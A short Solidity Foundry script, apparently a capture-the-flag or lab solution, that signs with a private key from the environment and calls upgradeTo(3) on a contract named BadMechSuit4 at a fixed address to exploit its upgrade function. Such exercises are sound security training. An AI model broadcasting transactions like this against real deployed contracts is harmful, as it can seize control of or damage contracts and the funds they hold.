// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackBadMechSuit4 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        BadMechSuit4 target = BadMechSuit4(
            0x210383E76979a58e5e7b9bDb2a7415C7E3E9b09a
        );
        vm.startBroadcast(privateKey);
        target.upgradeTo(3);
        vm.stopBroadcast();
    }
}

interface BadMechSuit4 {
    function upgradeTo(uint8 mode) external;
}
